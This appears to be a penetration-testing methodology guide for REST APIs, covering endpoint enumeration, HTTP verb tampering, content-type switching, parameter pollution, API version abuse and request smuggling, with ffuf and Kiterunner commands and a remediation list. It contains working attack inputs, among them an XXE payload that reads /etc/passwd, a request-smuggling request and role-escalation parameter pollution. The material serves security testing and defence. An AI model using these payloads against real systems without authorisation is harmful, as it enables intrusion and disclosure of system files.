# REST API Penetration Testing Methodology

## Overview
REST API penetration testing is a structured methodology for discovering and exploiting vulnerabilities in RESTful web services. This skill focuses on the tactical techniques of API reconnaissance and manipulation: endpoint enumeration, HTTP verb tampering, content-type abuse, parameter pollution, API versioning bypass, and other protocol-level attacks that are prerequisites for deeper exploitation.

## Classification
- **CWE:** CWE-16 (Configuration), CWE-444 (Inconsistent Interpretation of HTTP Requests), CWE-235 (Improper Handling of Extra Parameters), CWE-436 (Interpretation Conflict)
- **OWASP:** API8:2023 - Security Misconfiguration, API9:2023 - Improper Inventory Management
- **CVSS Base:** 4.3 - 8.6 (Medium to High, depending on technique and impact)
- **MITRE ATT&CK:** T1595 (Active Scanning), T1190 (Exploit Public-Facing Application)

## Detection Methodology

### 1. Endpoint Enumeration
Systematically discover API endpoints through multiple techniques:

**Wordlist-based discovery:**
```bash
# Common API path patterns
/api /api/v1 /api/v2 /api/v3
/api/users /api/admin /api/config /api/debug /api/health
/api/internal /api/private /api/test /api/staging
/api/swagger /api/docs /api/schema /api/graphql
/v1/users /v2/users /v3/users
```

**Documentation scraping:**
```
/swagger.json  /swagger.yaml  /swagger/v1/swagger.json
/openapi.json  /openapi.yaml  /api-docs  /api-docs.json
/redoc  /.well-known/openapi  /docs  /api/docs
```

**Other discovery sources:**
- JavaScript source analysis: search for `fetch`, `axios`, `XMLHttpRequest`, `/api/` patterns
- Mobile app decompilation (APK/IPA) for hardcoded API paths
- HATEOAS links in API responses revealing related endpoints
- Predictable patterns: `/api/v1/users/{id}/profile`, `/settings`, `/roles`

### 2. HTTP Verb Tampering
Test each endpoint with unexpected HTTP methods:
```bash
# Standard methods
GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS

# Non-standard / override methods
TRACE, CONNECT, PROPFIND, MOVE, COPY, LOCK, UNLOCK

# Method override headers (bypass method restrictions)
X-HTTP-Method: DELETE
X-HTTP-Method-Override: PUT
X-Method-Override: PATCH

# Method override via query parameter
POST /api/users/1?_method=DELETE
POST /api/users/1?method=PUT

# Test method routing mismatches
# Endpoint allows GET but blocks DELETE
# Try: POST with X-HTTP-Method-Override: DELETE
```

**What to look for:**
- Different responses for different verbs (indicates hidden functionality)
- `405 Method Not Allowed` with `Allow` header revealing accepted methods
- `200 OK` on unexpected methods (TRACE, DELETE on collection endpoints)
- Method override headers bypassing WAF or reverse proxy restrictions

### 3. Content-Type Manipulation
Test how the API handles different content types:
```
# Standard content types
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data

# Type switching attacks
# If API expects JSON, send XML (may enable XXE)
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><user>&xxe;</user></root>

# Send form-encoded instead of JSON
Content-Type: application/x-www-form-urlencoded
user=admin&role=admin

# Charset manipulation
Content-Type: application/json; charset=utf-7
Content-Type: application/json; charset=utf-16

# MIME type confusion
Content-Type: text/plain           (bypass CSRF protections)
Content-Type: application/octet-stream
Content-Type: text/html            (may trigger XSS in response)

# Missing Content-Type
# Send request without Content-Type header — test parser fallback
```

### 4. HTTP Parameter Pollution (HPP)
Send duplicate parameters to exploit parsing inconsistencies:
```
# Query string pollution
GET /api/users?id=1&id=2
# Different frameworks handle this differently:
#   Express.js: id = "1" (first)  or  id = ["1","2"] (array)
#   PHP:        id = "2" (last)
#   ASP.NET:    id = "1,2" (concatenated)
#   Python:     id = "1" (first) or id = ["1","2"]

# JSON parameter pollution
{"user": "normal", "role": "user", "role": "admin"}
# Some parsers take last value, some take first

# Combine parameter sources
POST /api/users?role=user
Content-Type: application/json
{"role": "admin"}
# Which takes precedence: query string or body?

# Array injection
id[]=1&id[]=2
user[role]=admin
user[0][role]=admin
```

### 5. API Versioning Abuse
Exploit older or undocumented API versions:
```
# URL path versioning
GET /api/v1/users         (current, hardened)
GET /api/v2/users         (beta, less tested)
GET /api/v0/users         (legacy, unpatched)
GET /api/beta/users
GET /api/internal/users
GET /api/latest/users

# Header-based versioning
Accept: application/vnd.api.v1+json
Accept: application/vnd.api.v2+json
Accept: application/vnd.api.v0+json
X-API-Version: 1
X-API-Version: 2
API-Version: 2023-01-01
API-Version: 2020-01-01     (old version, may lack security patches)

# Query parameter versioning
GET /api/users?version=1
GET /api/users?v=0
GET /api/users?api_version=beta
```

### 6. Request Smuggling and Response Analysis
```
# Transfer-Encoding / Content-Length conflict
POST /api/users HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked
0
GET /admin

# Check for verbose errors, debug headers (X-Debug, X-Powered-By, Server)
# Cache-Control on sensitive endpoints, CORS wildcards, missing security headers
# API key in URL (logged/cached), predictable key patterns, revoked key reuse
```

## Tool Usage

### ffuf
```bash
# Endpoint enumeration
ffuf -u http://target.com/api/FUZZ -w api-wordlist.txt -mc 200,201,204,301,302,401,403

# Version discovery
ffuf -u http://target.com/api/vFUZZ/users -w <(seq 0 10) -mc 200,301

# Parameter fuzzing
ffuf -u http://target.com/api/users?FUZZ=test -w params.txt -fs 0

# Method fuzzing
ffuf -u http://target.com/api/users/1 -X FUZZ -w methods.txt -mc all -fc 405
```

### Kiterunner
```bash
# API-aware endpoint discovery using OpenAPI/Swagger schemas
kr scan http://target.com -w routes-large.kite -A=apiroutes-240128
```

### Postman / mitmproxy
```
# Postman: import OpenAPI spec, create versioned environments, run collection tests
# mitmproxy: intercept and modify API traffic with scripted parameter manipulation
```

## Remediation
1. **API inventory management** -- maintain a complete, versioned catalog of all endpoints; decommission unused versions
2. **Strict method enforcement** -- explicitly allow only required HTTP methods per endpoint; return 405 for all others
3. **Content-Type validation** -- reject requests with unexpected Content-Type; never auto-detect parsers
4. **Parameter validation** -- reject duplicate parameters; define strict schemas with allow-lists
5. **Version deprecation** -- enforce sunset dates; disable old versions that lack current security controls
6. **Disable method override headers** -- reject X-HTTP-Method-Override unless explicitly needed
7. **Minimize error verbosity** -- return generic error messages in production; log details server-side only
8. **API gateway enforcement** -- route all API traffic through a gateway with authentication, rate limiting, and schema validation

## Evidence Collection
- Discovered endpoints not listed in public documentation (shadow APIs)
- HTTP verb tampering results showing unauthorized operations
- Content-Type switching responses demonstrating parser confusion or XXE
- Parameter pollution examples with different backend interpretations
- Old API versions accessible with weaker security controls
- API documentation files obtained (swagger.json, openapi.yaml)
- Verbose error messages exposing internal details
- Method override headers that bypass security controls
